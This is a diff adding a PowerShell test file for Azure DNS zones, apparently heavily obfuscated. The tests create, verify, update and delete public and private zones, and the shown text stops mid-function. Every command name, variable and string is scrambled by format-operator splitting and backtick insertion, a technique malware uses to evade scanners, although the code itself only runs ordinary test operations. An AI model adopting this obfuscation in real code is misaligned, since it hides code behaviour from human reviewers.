@@ -1,0 +1,758 @@
+ SeT-iTEM  ("{0}{2}{1}"-f'V','nSp','arIABLe:ex') ( [tYpe]("{4}{1}{0}{3}{2}"-f'STeM.S','y','ing','TR','s')  )  ;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function T`Est-zon`eC`RuD
+{
+	${zONe`N`AMe} = &("{1}{0}{4}{5}{3}{2}"-f'e','G','mZoneName','o','t-R','and')
+    ${rES`OUR`cEgro`UP} = &("{1}{3}{2}{0}{4}" -f 'eGro','TestSetup','CreateResourc','-','up')
+	${cREate`DZ`o`Ne} = &("{0}{2}{1}" -f'New-AzDnsZo','e','n') -Name ${ZonE`N`AmE} -ResourceGroupName ${r`ESOuR`cEGROuP}."r`eS`OuR`CEGR`oupNaMe" -Tags @{("{1}{0}"-f '1','tag')=("{1}{0}{2}" -f 'lu','va','e1')}
+
+	&("{3}{2}{0}{1}"-f '-NotNu','ll','t','Asser') ${creAT`EdzO`NE}
+	&("{2}{1}{3}{4}{0}" -f'otNull','sser','A','t-','N') ${C`REATEDz`onE}."ET`AG"
+	&("{2}{4}{0}{1}{3}" -f't-','Ar','Ass','eEqual','er') ${z`o`NEn`Ame} ${CReATe`dZ`One}."na`Me"
+	&("{1}{3}{0}{4}{2}" -f'-Ar','Ass','qual','ert','eE') ${r`esOuRCeG`R`ouP}."r`EsO`UrCEgRoUpN`AMe" ${crE`AtEDz`onE}."REs`oURcEgRo`Upn`AMe"
+	&("{0}{2}{3}{1}{4}"-f 'Assert-','u','AreE','q','al') 1 ${CREa`T`edzone}."t`Ags"."c`oUNt"
+	&("{1}{2}{0}"-f 'ual','Assert-Are','Eq') 2 ${Crea`TEd`ZONE}."numBErof`RecoR`d`sEtS"
+	&("{3}{1}{0}{2}"-f 'NotE','-Are','qual','Assert') ${c`R`EA`TEdzONE}."NumBeRo`FR`eCor`DS`ets" ${cReA`T`e`DZOne}."mAX`NUmbeROfReCo`RDsE`TS"
+	&("{0}{2}{1}"-f'Ass','-Null','ert') ${CReATe`dz`O`Ne}."ty`pe"
+	&("{1}{3}{0}{2}"-f'Equ','Asser','al','t-Are') 0 ${cr`E`AtedZOnE}."R`Eg`iS`T`RAtIonv`IR`TUA`lNEtworKiDS"."C`ount"
+	&("{4}{3}{1}{2}{0}" -f'eEqual','A','r','t-','Asser') 0 ${creAtE`dZ`oNe}."resOLutiONvir`TU`A`lNetw`Or`kIDS"."C`OUNt"
+
+	${Ret`R`Ie`VeD`ZoNE} = &("{2}{1}{3}{0}"-f'one','et-AzDns','G','Z') -Name ${zo`N`E`NaME} -ResourceGroupName ${rEs`ouRCeGRO`UP}."rEs`oURCeGrO`UPN`AmE"
+
+	&("{2}{0}{1}" -f'ert-N','otNull','Ass') ${REtrievE`DZo`Ne}
+	&("{0}{1}{2}" -f'A','ssert-Not','Null') ${reTRIE`VeDZ`one}."eT`Ag"
+	&("{2}{0}{1}{3}{4}" -f'e','rt-A','Ass','r','eEqual') ${zONe`N`AmE} ${REtRiev`ed`Z`OnE}."Na`Me"
+	&("{2}{0}{1}{3}" -f's','ser','A','t-AreEqual') ${re`s`oUrceg`ROUp}."r`E`SouR`Ce`GROuPNAmE" ${rE`TRiE`VEd`zOne}."r`eSo`UrcE`GRoupNAmE"
+	&("{2}{0}{3}{1}"-f't-','eEqual','Asser','Ar') ${REtr`Ieve`D`zOne}."E`TaG" ${CR`e`ATEdzone}."ET`AG"
+	&("{2}{0}{1}{3}" -f'ert-AreEq','ua','Ass','l') 1 ${REtRIeVe`d`z`O`NE}."Ta`gS"."COU`NT"
+	&("{3}{1}{2}{0}"-f 'l','qu','a','Assert-AreE') ${c`R`eaTedzOnE}."n`UMberO`F`REc`O`Rdsets" ${REt`Riev`Ed`zONe}."Nu`mBER`ofReCord`seTS"
+	&("{1}{3}{2}{0}"-f '-Null','As','ert','s') ${RetrIE`V`e`d`zOnE}."ty`Pe"
+	&("{1}{4}{2}{3}{0}" -f'al','Asser','e','Equ','t-Ar') 0 ${retrIe`Ve`dZ`onE}."re`gIS`T`RATionvIr`TUalNet`WORkIDS"."Co`UnT"
+	&("{0}{1}{3}{2}"-f 'As','sert-Are','l','Equa') 0 ${RetRIEv`e`DzonE}."Re`sOl`UT`ionvIRT`UAlneTWOrkIdS"."COu`NT"
+	
+	
+
+	${uP`daTED`Z`oNE} = &("{1}{0}{2}" -f 'et-AzD','S','nsZone') -Name ${Zo`Ne`Na`mE} -ResourceGroupName ${resOu`Rc`E`g`ROup}."R`ES`O`URcegR`oupnamE" -Tags @{("{1}{0}"-f '1','tag')=("{1}{0}"-f'ue1','val');("{0}{1}" -f 't','ag2')=("{1}{0}" -f '2','value')}
+
+	&("{1}{2}{3}{0}" -f'otNull','Ass','ert-','N') ${Up`DatE`DZ`oNE}
+	&("{1}{0}{3}{4}{2}"-f'ss','A','ull','ert-Not','N') ${updA`T`eDZoNE}."e`TAg"
+	&("{0}{2}{3}{1}"-f'A','ual','ssert','-AreEq') ${ZOn`enaME} ${u`PdaTed`zoNe}."nA`ME"
+	&("{4}{0}{3}{2}{1}"-f 's','qual','rt-AreE','se','A') ${re`SouRcEg`R`ouP}."R`EsoUr`ceGR`OuPname" ${upDAT`e`DZ`OnE}."r`EsouR`CeGRO`UpnAmE"
+	&("{1}{3}{4}{2}{0}"-f'tEqual','Asse','No','rt-Ar','e') ${uPD`ATEd`zO`NE}."E`TAG" ${Cr`eate`dzonE}."e`TAG"
+	&("{3}{2}{0}{1}"-f'eEqua','l','t-Ar','Asser') 2 ${Upd`At`EdZONe}."Ta`gS"."C`oUNT"
+	&("{1}{0}{2}"-f'ert','Ass','-Null') ${uPd`AteDzo`NE}."Ty`PE"
+	&("{2}{3}{0}{1}"-f'eE','qual','A','ssert-Ar') 0 ${U`pd`At`edZonE}."RE`G`iST`Rati`on`VIRtUaln`ETw`Orki`dS"."CoU`NT"
+	&("{2}{3}{0}{1}"-f'AreE','qual','Asser','t-') 0 ${UP`DAT`EdZonE}."RESOl`U`TIoNVir`TuAlne`TwORkidS"."Co`UNt"
+
+	${R`e`TRiEv`EDZo`NE} = &("{0}{2}{1}"-f 'Get-AzDns','ne','Zo') -Name ${Z`o`NeNamE} -ResourceGroupName ${R`eso`URcegrO`Up}."Resou`RCe`GrOuPna`mE"
+
+	&("{0}{1}{2}{3}" -f'Ass','e','rt-N','otNull') ${r`eT`RieV`eDZO`NE}
+	&("{0}{2}{4}{1}{3}"-f 'A','t-NotNu','sse','ll','r') ${rETR`IEv`e`DZ`OnE}."e`TAG"
+	&("{1}{0}{2}{3}" -f'er','Ass','t','-AreEqual') ${ZO`NENa`me} ${Ret`RIeV`e`d`zONE}."N`AME"
+	&("{3}{0}{1}{2}"-f 'sser','t-A','reEqual','A') ${RESoUr`Ce`GrOUp}."R`EsourCE`G`ROupnA`mE" ${rEt`RIEVE`dzo`Ne}."ReS`O`Ur`C`egROUPn`AME"
+	&("{1}{2}{0}{3}"-f'r','As','se','t-AreEqual') ${re`T`RiEV`eDZoNe}."e`TAg" ${UP`da`TEDZ`onE}."e`TAG"
+	&("{1}{0}{3}{2}" -f 'r','Asse','qual','t-AreE') 2 ${R`ETRiEvE`DZ`One}."t`Ags"."coU`Nt"
+	&("{0}{2}{1}"-f 'A','t-Null','sser') ${re`TRI`e`VEDZone}."TY`pE"
+	&("{0}{2}{1}{3}"-f'Asse','AreEq','rt-','ual') 0 ${re`TriEv`eDzoNE}."rE`GiST`RA`TIO`Nvi`R`T`UaLn`EtWoRKidS"."Co`UNt"
+	&("{1}{3}{2}{0}" -f'qual','Assert-A','E','re') 0 ${re`T`R`IEve`dzoNe}."REso`lUT`Ion`V`iRtUaLn`etwORk`iDS"."c`OUnt"
+
+	${RE`MO`VEd} = &("{0}{2}{4}{3}{1}" -f'R','DnsZone','em','e-Az','ov') -Name ${zon`ena`mE} -ResourceGroupName ${r`eSo`UrcegRO`Up}."ReS`OURC`e`GrOUp`N`Ame" -PassThru -Confirm:${fAl`sE}
+
+	&("{1}{0}{3}{2}" -f'ssert-','A','e','Tru') { ${rE`MO`Ved} }
+
+	&("{2}{0}{1}"-f 'row','s','Assert-Th') { &("{2}{0}{1}{3}"-f 't','-AzDnsZo','Ge','ne') -Name ${Zonen`AmE} -ResourceGroupName ${reSouR`c`EgR`oUp}."R`e`SoUrcEgRo`UP`NAme" }
+	&("{3}{2}{1}{0}" -f 'ceGroup','our','es','Remove-AzR') -Name ${r`eS`ourCegRo`Up}."RESouRC`E`GRoU`pn`A`ME" -Force
+}
+
+
+function te`st-zON`e`wiTH`dElEGAtioN
+{
+	
+	${Par`ENtZ`on`ENAmE} = &("{5}{4}{2}{0}{1}{3}" -f 'ndomZ','oneN','a','ame','et-R','G')
+    ${rEs`Our`cEGRO`Up} = &("{4}{3}{1}{2}{6}{5}{0}"-f 'roup','-CreateRe','s','etup','TestS','ceG','our')
+	
+	try
+    {
+        ${C`REatedPA`R`EnTZO`NE} = &("{1}{3}{0}{2}"-f'Z','New-','one','AzDns') -Name ${P`AreN`T`zOneNaME} -ResourceGroupName ${reSo`UrC`EgR`OuP}."ReSourCe`gr`oU`pnaMe" -Tags @{("{0}{1}" -f'ta','g1')=("{0}{1}" -f'va','lue1')}
+
+		&("{0}{3}{1}{2}"-f'Assert-','Nu','ll','Not') ${crE`ATe`d`p`AREnTzONE}
+		&("{2}{1}{0}"-f'll','u','Assert-NotN') ${CReATEd`p`A`REN`TZone}."et`AG"
+		&("{3}{0}{2}{1}" -f'ser','reEqual','t-A','As') ${P`A`RENt`zonenaME} ${cre`At`EdPaRentZO`NE}."N`Ame"
+		&("{3}{0}{1}{2}"-f '-Are','E','qual','Assert') ${re`so`UrCEgR`O`Up}."r`eSourc`EgR`Ou`PNaME" ${c`REat`E`DPAREN`TZOnE}."ResO`UR`c`egRouPnaME"
+		&("{1}{0}{2}{3}" -f 'A','Assert-','re','Equal') 1 ${C`ReatEdpAr`ENT`zone}."t`AgS"."c`OUnt"
+		&("{1}{4}{3}{0}{2}" -f'Ar','Ass','eEqual','t-','er') 2 ${cr`E`AT`EDpAREnT`ZonE}."nUmBer`OFr`ec`oRDsETs"
+		&("{1}{2}{3}{0}" -f'ual','Ass','ert-Are','NotEq') ${CRe`At`EdPAreNTZ`ONE}."numberoFre`CORd`sE`TS" ${c`Rea`T`Ed`ParenTz`oNe}."m`A`Xnum`BEro`FrecO`RdSeTS"
+		&("{1}{0}{2}"-f 'sert','As','-Null') ${Cr`eatEd`PArE`NT`zOne}."t`YPe"
+
+		
+		${cH`IL`dZ`one`NamEpR`EF`IX} = &("{3}{2}{0}{1}"-f 'oneN','ame','mZ','Get-Rando')
+		${CH`ilD`ZO`NE`NamE} = ${ChILdzONENA`MePr`e`FIx} + '.' + ${Pa`R`eNT`zONEnamE}
+		${CrE`At`edChilD`Z`one} = &("{0}{3}{1}{2}" -f'N','z','DnsZone','ew-A') -Name ${C`H`iLdZ`oNEna`Me} -ResourceGroupName ${ResOuRCe`G`Ro`UP}."R`E`souRc`EGrou`PName" -Tags @{("{1}{0}" -f'ag1','t')=("{1}{0}" -f 'alue1','v')} -ParentZoneName ${P`Are`N`Tz`OnENamE}
+
+		&("{2}{1}{0}"-f 'otNull','-N','Assert') ${cREatEdCh`ild`z`o`Ne}
+		&("{2}{1}{0}{3}" -f'N','sert-Not','As','ull') ${creAtE`d`CH`il`dZone}."et`Ag"
+		&("{3}{4}{1}{0}{2}"-f'ua','q','l','Assert','-AreE') ${C`hiLdZoNE`NA`ME} ${Cr`EaTEDcHI`ldzo`Ne}."nA`mE"
+		&("{3}{0}{1}{2}" -f's','er','t-AreEqual','As') ${RE`s`oURCEGr`OUP}."r`ESO`U`RCeG`RoUPnAme" ${c`Rea`T`edCH`il`dZONE}."re`S`OURCEGr`oUPNAME"
+		&("{3}{0}{2}{1}" -f 'AreEqu','l','a','Assert-') 1 ${c`REatE`D`CHI`lD`ZONe}."T`AgS"."C`OunT"
+		&("{3}{0}{1}{4}{2}"-f'sser','t-Ar','al','A','eEqu') 2 ${CrEaTe`dch`I`l`dzONe}."nUmbeR`ofrECOrd`SE`Ts"
+		&("{1}{2}{0}{3}"-f'u','Assert-','AreNotEq','al') ${cR`eaTeDch`I`LdzONe}."NUmBe`Ro`FreCorD`SetS" ${cRe`ATEd`C`H`IldZone}."MAx`N`UmBEROFrECO`R`Dse`TS"
+		&("{3}{2}{0}{1}"-f'-Nu','ll','t','Asser') ${C`REaT`e`dChil`dZoNe}."T`ype"
+
+		
+		${D`ele`GaTI`ON`ReCoRdS`ET} = &("{0}{2}{3}{4}{1}"-f 'Ge','Set','t-A','zD','nsRecord') -Name ${ChIlD`zoN`enA`M`E`PrEFIX} -RecordType ('NS') -ZoneName ${p`ArE`NTZone`NaMe} -ResourceGroupName ${REsO`UrC`egr`OUp}."RE`s`o`Urc`EGr`OUPnaME"
+	
+		&("{3}{0}{1}{2}{4}"-f 'sert-','No','tN','As','ull') ${DeLeGATiO`Nre`C`O`RdseT}
+		&("{4}{3}{2}{0}{1}"-f'u','ll','tN','-No','Assert') ${DEl`e`g`AtioNRe`CORdSEt}."rE`cO`RDs"
+		&("{0}{4}{3}{1}{2}" -f 'Ass','a','l','rt-AreEqu','e') ${creat`eDCH`IlD`z`OnE}."NAMe`SER`VeRS"."cO`UNt" ${De`le`g`ATIo`NREcO`RdSEt}."RecOR`dS"."Cou`NT"
+
+		
+		${R`EMoV`E`dPaRe`Nt} = &("{1}{2}{4}{0}{3}" -f 'DnsZ','Re','mo','one','ve-Az') -Name ${PaR`ent`zOnEna`Me} -ResourceGroupName ${Re`s`OurcE`gro`UP}."ResO`U`RcEGroUp`NaME" -PassThru -Confirm:${fal`sE}
+		${ReMOvEdch`i`ld} = &("{4}{5}{2}{1}{0}{3}"-f 'DnsZ','z','A','one','R','emove-') -Name ${chI`ldZon`ENaME} -ResourceGroupName ${RESOU`R`ceg`ROUp}."r`E`SOUrCEgrOuPN`A`me" -PassThru -Confirm:${fA`LSE}
+
+		&("{2}{0}{1}{3}"-f 's','sert-Tr','A','ue') { ${r`eMOVe`DPaR`ent} }
+		&("{0}{1}{2}" -f 'Ass','er','t-True') { ${r`EMO`VedCHilD} }
+
+		&("{2}{0}{1}"-f 'w','s','Assert-Thro') { &("{1}{2}{0}{3}" -f'n','Get-A','zDnsZo','e') -Name ${PAReNTZoN`en`A`ME} -ResourceGroupName ${rEso`URCeG`ROup}."r`es`o`UrCegR`OuPnAme" }
+		&("{1}{0}{3}{2}" -f 'ert','Ass','hrows','-T') { &("{0}{2}{3}{1}" -f'Get-AzD','ne','n','sZo') -Name ${cHil`Dz`O`N`EName} -ResourceGroupName ${R`ESOU`Rce`gRoUp}."ReS`oUrCeG`ROUp`NAme" }
+    }
+    finally
+    {
+        &("{1}{2}{4}{0}{3}" -f'ceGrou','R','emove-AzReso','p','ur') -Name ${RES`OUr`CE`GrO`UP}."re`SO`UrcEGROUpnA`me" -Force
+    }
+}
+
+function TES`T-`pR`iVAtEzo`NEcR`UD
+{
+	${z`oN`eNAmE} = &("{1}{2}{3}{0}"-f 'mZoneName','G','et','-Rando')
+    ${R`eso`UrCEgR`Oup} = &("{1}{6}{7}{0}{5}{4}{3}{2}" -f 'tup-Cre','Tes','Group','ource','eRes','at','tS','e')
+	${r`eGV`iRtUal`NetWo`RK} = &("{7}{6}{2}{0}{8}{4}{3}{1}{5}"-f'p','eVirtualNet','tu','at','Cre','work','stSe','Te','-') ${Resou`RC`egR`ouP}
+	${Res`VIr`T`UA`lN`etWORK} = &("{7}{5}{1}{2}{4}{3}{6}{0}"-f 'ork','t','eVi','lN','rtua','etup-Crea','etw','TestS') ${rE`SO`Urceg`RoUP}
+
+	${c`ReateDZ`OnE} = &("{0}{1}{2}"-f 'N','ew-A','zDnsZone') -Name ${zo`N`eN`AME} -ResourceGroupName ${r`eSOuRCE`g`RoUp}."RE`So`URCeGr`OU`pnAMe" -Tags @{("{1}{0}"-f 'ag1','t')=("{0}{1}" -f 'valu','e1')} -ZoneType ("{0}{1}" -f 'Priv','ate') -RegistrationVirtualNetworkId @(${REG`VI`R`TuAlNe`TW`OrK}."id") -ResolutionVirtualNetworkId @(${res`VIrTu`A`ln`etWORK}."iD")
+	&("{3}{0}{1}{2}{4}" -f 's','ert','-N','As','otNull') ${cr`eAt`edzo`NE}
+	&("{1}{0}{2}{3}{4}"-f'ss','A','ert-N','o','tNull') ${CrE`A`TE`DZOne}."ET`Ag"
+	&("{1}{0}{3}{2}" -f'rt','Asse','qual','-AreE') ${ZO`Nen`AmE} ${Creat`E`dZ`oNE}."N`AME"
+	&("{3}{1}{0}{2}"-f '-A','t','reEqual','Asser') ${r`eSOUr`CEgR`ouP}."RESOUrCE`grou`p`N`AmE" ${crEatE`d`z`OnE}."resO`U`RCEGRO`U`Pn`AMe"
+	&("{3}{2}{1}{0}" -f'Equal','Are','rt-','Asse') 1 ${C`ReATEDZO`NE}."ta`GS"."cO`Unt"
+	&("{3}{2}{0}{1}"-f 'ua','l','eEq','Assert-Ar') 1 ${CRe`ATed`zo`NE}."n`Um`BEROFREC`OrdsetS"
+	&("{1}{4}{2}{5}{3}{0}" -f 'qual','Assert','Are','E','-','Not') ${CRE`AtEdzo`Ne}."Nu`MB`eroFRe`CORdSE`Ts" ${CR`EAted`Z`oNE}."MaX`N`UmbE`R`oFre`CoRdsetS"
+	&("{1}{3}{0}{2}" -f'ua','Ass','l','ert-AreEq') ("{0}{2}{1}" -f'Pri','ate','v') ${CrE`AT`edzonE}."zoNe`TY`pe"
+	&("{1}{2}{0}" -f'AreEqual','Asse','rt-') 1 ${CRE`A`TeD`ZonE}."rEGistRatI`OnvIrtUa`ln`EtworK`iDs"."CO`UNt"
+	&("{2}{1}{3}{0}"-f'Equal','s','A','sert-Are') ${ReG`VI`R`TUA`LNETWOrk}."iD" ${C`ReaT`Ed`zoNe}."R`EGiStRATI`On`V`irtu`ALnETw`orkIDs"[0]
+	&("{2}{3}{1}{0}"-f'al','u','Asse','rt-AreEq') 1 ${cRe`AT`edZo`Ne}."r`ESOLutIONV`iRt`UaLneTw`oR`KIds"."C`oUnT"
+	&("{0}{3}{1}{4}{2}" -f 'Asse','Are','ual','rt-','Eq') ${R`ESVirtuA`LN`E`T`WOrk}."I`d" ${cr`eaT`ed`zOne}."r`EsO`l`UtIonvI`RtUAl`NE`TWORkIDs"[0]
+
+	${reT`Ri`EVEDZoNE} = &("{0}{1}{2}"-f 'G','et-','AzDnsZone') -Name ${ZOnEn`A`ME} -ResourceGroupName ${r`Es`o`URCEgr`Oup}."Re`SOU`RC`e`GrOuPnamE"
+	&("{4}{3}{0}{1}{2}"-f 'sert','-NotN','ull','s','A') ${R`e`TrieVEdZO`Ne}
+	&("{1}{3}{2}{0}" -f'l','Assert','NotNul','-') ${Re`TrIE`VedZ`ONE}."E`TaG"
+	&("{1}{2}{3}{0}"-f 'ual','Asser','t-Ar','eEq') ${Z`ONe`N`Ame} ${reT`RIe`VedzoNe}."N`AME"
+	&("{1}{2}{0}{3}" -f'reE','Asse','rt-A','qual') ${rE`SO`U`R`CegrOUP}."rEsOU`RCEGroU`PNA`mE" ${Re`TrIEv`eDz`One}."r`ESOUr`cEgrOup`NA`mE"
+	&("{2}{0}{1}{4}{3}"-f'sert-','AreE','As','l','qua') ${rET`Riev`e`dz`oNE}."E`TAg" ${Cr`EaTeDzO`Ne}."e`TAG"
+	&("{2}{3}{0}{4}{1}" -f 'sert','reEqual','A','s','-A') 1 ${rE`T`RI`eVeDZ`oNe}."t`AGS"."C`OunT"
+	&("{0}{3}{2}{1}{4}"-f 'A','ert-A','s','s','reEqual') ${c`REATEd`zO`NE}."nUmbEROF`RecO`R`d`Sets" ${retRIEv`EdZ`oNe}."n`Um`Be`RoFRE`cordSEtS"
+	&("{1}{2}{0}"-f 'Equal','As','sert-Are') ("{2}{1}{0}" -f'e','t','Priva') ${r`ET`RI`EVeDzoNe}."zo`NETY`pE"
+	&("{0}{2}{3}{1}" -f 'A','eEqual','ssert-A','r') ${c`REATE`Dz`OnE}."REGIST`Rat`iOn`VirT`U`ALnetwORki`Ds"."Cou`Nt" ${RET`RieveD`Zo`Ne}."Re`gis`TRATiON`VIRtU`ALNetWO`R`kIDS"."co`UNt"
+	&("{0}{2}{4}{1}{3}" -f 'Ass','u','ert-Ar','al','eEq') ${c`ReatE`DZ`onE}."re`gi`s`T`R`At`ionVirtU`AlNETWOR`kids"[0] ${R`eTr`ieV`EDzOne}."R`EgIStR`AtiOn`VirTuAlNetwOr`ki`Ds"[0]
+	&("{3}{0}{2}{1}{4}" -f'ert','e','-Ar','Ass','Equal') ${cREa`T`E`dZoNE}."RE`sOLuTI`O`N`Vir`TuAl`NE`TwOrKIdS"."coU`Nt" ${R`EtRieveDz`One}."Resol`U`T`iOnVirTu`AlNE`TWorK`iDS"."C`OuNt"
+	&("{1}{0}{2}{3}" -f 'u','Assert-AreEq','a','l') ${c`REaT`ed`zOne}."ResoluTI`o`N`ViRTuaLN`ET`wo`Rk`ids"[0] ${REtRi`E`Ve`dZOne}."reSOl`UTiOnviRTuAlN`E`TW`ork`idS"[0]
+	
+	
+
+	${upD`AT`ed`ZOnE} = &("{0}{4}{2}{1}{3}" -f 'S','s','AzDn','Zone','et-') -Name ${z`O`NenaME} -ResourceGroupName ${ResO`UrC`eGR`O`Up}."rEsoUR`ce`gR`OUp`NAME" -Tags @{("{0}{1}"-f 't','ag1')=("{0}{1}" -f'v','alue1');("{0}{1}"-f 'ta','g2')=("{1}{0}"-f 'alue2','v')} -RegistrationVirtualNetworkId @() -ResolutionVirtualNetworkId @()
+	&("{3}{2}{0}{1}" -f'ert-NotNu','ll','ss','A') ${upDATEd`Z`oNe}
+	&("{2}{3}{0}{4}{1}" -f'-N','ull','Asser','t','otN') ${UPdA`TED`zo`NE}."e`TAG"
+	&("{1}{0}{3}{2}"-f 'ss','A','Equal','ert-Are') ${z`O`NenaME} ${u`PD`ATE`DZoNE}."nA`mE"
+	&("{0}{3}{2}{1}" -f 'Asse','qual','t-AreE','r') ${RE`So`UrC`eG`RouP}."rE`Sou`RcEg`ROuP`NAmE" ${uP`dATeDzO`Ne}."Re`sO`UrCe`gROUpnAME"
+	&("{4}{3}{2}{0}{1}"-f'-AreNotE','qual','ert','ss','A') ${UpD`Ate`dz`OnE}."Et`Ag" ${cr`EAteDZ`OnE}."Et`AG"
+	&("{1}{2}{0}{3}"-f 'q','Assert-Ar','eE','ual') 2 ${uP`Da`TE`dZonE}."tA`GS"."c`oUNT"
+	&("{1}{2}{0}" -f'Equal','Assert-Ar','e') ("{0}{1}{2}" -f'Pr','ivat','e') ${uP`daTE`DZONe}."ZO`NeT`YpE"
+	&("{0}{1}{3}{2}{4}" -f'As','sert','AreEqua','-','l') 0 ${updAt`eDz`O`NE}."REg`IsT`Ra`TionV`IrtUaLnETwoRk`IdS"."cOu`Nt"
+	&("{3}{0}{1}{2}" -f 'A','reE','qual','Assert-') 0 ${UpDa`TeDZO`NE}."rEsOLu`TioN`VIr`Tu`ALNE`TW`OrKiDS"."c`ounT"
+
+	${UPdAtEDz`o`Ne}."REgIStRAtIon`ViRtUaL`N`eTw`oRki`dS" = @(${Reg`V`IrTUA`L`NeTWork}."iD")
+	${U`PdaTe`dZo`NE}."Res`OLuTi`ON`ViRTU`ALnet`wo`RKIdS" = @(${ReS`VirTuAL`NE`T`W`oRk}."i`d")
+	${upDatE`Dz`onE} = ${uPDate`dz`O`Ne} | &("{1}{2}{3}{0}" -f 'Zone','Set-','AzDn','s')
+	&("{4}{3}{1}{2}{0}"-f 'tNull','sert-','No','s','A') ${u`pDat`EDz`one}
+	&("{2}{0}{4}{1}{3}"-f'sert-Not','l','As','l','Nu') ${Up`dAT`e`dzone}."e`Tag"
+	&("{0}{3}{1}{2}"-f 'Asse','qu','al','rt-AreE') ${zO`N`eNAme} ${UPdAT`ED`Z`one}."n`AmE"
+	&("{3}{0}{1}{2}"-f 't','-Ar','eEqual','Asser') ${rE`so`U`RC`eGRouP}."Re`sou`R`cEgrOupNAME" ${UPDATeD`zo`Ne}."REs`OU`Rceg`ROUpnAmE"
+	&("{2}{1}{0}{3}"-f'sert-Ar','s','A','eNotEqual') ${U`pd`At`EdzonE}."e`TAG" ${CRe`At`EdzONe}."Et`Ag"
+	&("{3}{0}{1}{2}{4}" -f're','E','qua','Assert-A','l') 2 ${UP`dAT`EDzONE}."ta`Gs"."Co`Unt"
+	&("{3}{1}{2}{0}" -f 'qual','sser','t-AreE','A') ("{1}{0}{2}" -f 'rivat','P','e') ${uP`D`A`TEdzoNE}."Z`Onet`YPe"
+	&("{3}{0}{2}{1}" -f 'Eq','l','ua','Assert-Are') 1 ${U`p`DAtEdZoNe}."r`eG`iSTrAT`IONviRTUA`Ln`eTwork`IDS"."cO`UNt"
+	&("{0}{2}{3}{4}{1}"-f'Assert-','al','Ar','e','Equ') ${ReGvIRt`Ua`LnEtWO`RK}."i`D" ${UP`d`Ate`dZOnE}."r`eg`isTra`TiOn`ViRt`UAlnetwo`Rkids"[0]
+	&("{3}{2}{0}{4}{1}" -f 'rt-','l','se','As','AreEqua') 1 ${u`p`DaTeDZone}."rESO`Luti`o`NvIRTUALNEt`WO`RKiDS"."c`OuNT"
+	&("{1}{2}{4}{0}{3}"-f 'u','A','ssert-A','al','reEq') ${r`eSvIrtUaLNE`T`W`oRK}."I`d" ${u`p`DAted`zoNE}."RESO`lutioNVirTUa`lnETW`o`R`KiDS"[0]
+
+	${rEt`R`i`E`VeDZOne} = &("{0}{3}{2}{1}"-f'Get','e','n','-AzDnsZo') -Name ${zo`Ne`NAme} -ResourceGroupName ${Re`S`ouRCe`GrOUp}."Re`SourcEg`R`oUpN`AmE"
+	&("{2}{0}{1}{3}" -f 's','sert-No','A','tNull') ${Retr`iE`Ve`Dzo`NE}
+	&("{3}{0}{4}{2}{1}"-f 'er','ull','tN','Ass','t-No') ${reTrIevEd`zO`NE}."e`Tag"
+	&("{1}{0}{3}{2}"-f'sert-Ar','As','ual','eEq') ${ZoNEnA`Me} ${REtr`IE`VedZO`Ne}."NA`ME"
+	&("{0}{1}{2}"-f'Asser','t-Are','Equal') ${R`eSouRCe`Gr`o`Up}."REsOUR`cEGrou`p`NA`ME" ${r`Etri`evED`zO`Ne}."Re`SOURCeg`RoUpn`A`ME"
+	&("{1}{3}{2}{0}"-f'al','Assert-Ar','qu','eE') ${RE`T`RI`EVEdz`ONe}."E`TaG" ${uPd`AtEd`ZOnE}."eT`AG"
+	&("{2}{1}{0}" -f 'reEqual','sert-A','As') 2 ${REtRIE`VEDZ`oNe}."T`AGs"."c`ount"
+	&("{2}{0}{3}{1}"-f 's','eEqual','A','sert-Ar') ("{0}{1}{2}" -f'Pr','i','vate') ${re`TRievEDZ`O`Ne}."ZO`NE`TYpE"
+	&("{3}{1}{0}{2}" -f'reE','sert-A','qual','As') ${uP`Da`TEDZo`NE}."REG`iSTr`ATI`On`VirTUaLnetwO`RkidS"."C`OUnt" ${R`E`T`RIEveDzoNe}."r`e`g`IstraTioNVI`RtU`AlN`ETw`O`RKIDS"."C`Ount"
+	&("{0}{1}{2}{3}" -f'Asse','rt-AreE','q','ual') ${upd`A`TEdZOne}."REgis`TrA`TiON`VirTUA`L`NEtWOrkIdS"[0] ${rEt`Riev`eDZo`NE}."RE`GiST`RAtIo`N`Vi`RTua`lnET`WoRkIDS"[0]
+	&("{1}{3}{0}{2}" -f'r','Ass','t-AreEqual','e') ${UPd`Ate`DZonE}."R`ESO`lutiO`NVi`Rtu`Al`NE`Tworki`DS"."C`ount" ${RE`T`R`ie`VedZONe}."resOlut`IO`NviR`T`UA`lnetWOR`kids"."cOu`NT"
+	&("{2}{0}{1}{3}" -f 'rt-A','reEqua','Asse','l') ${u`pd`Ate`DZoNE}."rEsO`lU`Ti`ONV`I`R`TU`ALnetWoRK`iDS"[0] ${re`T`R`i`EvEDZONe}."r`esOL`Uti`OnV`IRtUAlne`TWORKids"[0]
+
+	${RE`M`OveD} = &("{3}{0}{2}{4}{1}" -f '-A','sZone','z','Remove','Dn') -Name ${ZOn`En`AME} -ResourceGroupName ${rE`so`UrC`eGROUP}."Re`S`oUr`ceGROUpnAmE" -PassThru -Confirm:${f`AL`se}
+
+	&("{1}{2}{0}" -f'True','Ass','ert-') { ${RE`m`oVed} }
+
+	&("{0}{2}{1}"-f'Ass','-Throws','ert') { &("{0}{2}{3}{1}" -f'Ge','Zone','t','-AzDns') -Name ${Z`oN`EName} -ResourceGroupName ${RE`soU`RceGRO`Up}."R`eSOUR`C`e`gRoupNAMe" }
+	&("{3}{6}{2}{5}{1}{0}{4}"-f 'c','r','e-AzR','Rem','eGroup','esou','ov') -Name ${rESo`UrCe`Gr`ouP}."rES`O`UrCEG`Ro`UP`NAmE" -Force
+}
+
+
+function tEst-`PR`I`V`ATeZOnEcru`DregIStRa`TIO`N`V`Net
+{
+	${ZOneN`A`Me} = &("{0}{3}{1}{2}{4}"-f'Get-Random','eNa','m','Zon','e')
+    ${rEsOU`RcEGrO`Up} = &("{6}{3}{1}{0}{4}{5}{8}{7}{2}" -f 're','-C','ceGroup','stSetup','ateR','e','Te','ur','so')
+	${regVIrT`U`A`ln`et`wORk} = &("{0}{5}{3}{1}{2}{4}{6}" -f 'TestS','e','ateVir','up-Cr','tualNe','et','twork') ${r`eSOuR`CeG`ROUP}
+
